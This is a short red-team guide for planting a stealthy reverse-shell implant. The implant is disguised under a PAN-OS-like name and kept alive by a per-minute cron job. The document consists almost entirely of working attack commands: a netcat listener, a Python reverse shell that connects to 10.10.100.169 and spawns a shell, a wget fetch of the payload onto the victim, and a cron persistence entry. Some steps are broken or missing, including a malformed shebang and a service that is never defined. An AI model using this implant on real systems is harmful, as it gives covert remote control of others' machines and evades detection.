# 3 Red Team Implant: `pan_os_comm.sh` with Stealthy Service

### 1. 🎯 Start the Listener on (ATTACKER)

```bash
nc -lvnp 63842
```

### 2. 📁 Create the Reverse Shell Script (ATTACKER)

```bash
sudo vim /tmp/pan_os_comm.py
```

`i`
```python
usr/bin/env python3 

import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.100.169",63842));

os.dup2(s.fileno(),0); 

os.dup2(s.fileno(),1);

os.dup2(s.fileno(),2);

import pty; pty.spawn("sh")
```
`:wq!`

```bash
cd /tmp
wget http://10.10.100.169/pan_os_comm.py
```
### 4. Change perms of python file (VICTIM)
Make it executable:
```bash
chmod +x /tmp/pan_os_comm.py
```
### 5. Add Crontab every minute (VICTIM)

```bash
(crontab -l 2>/dev/null; echo '* * * * * /bin/systemctl start pan_os_comm.service >/dev/null 2>&1') | crontab -
```

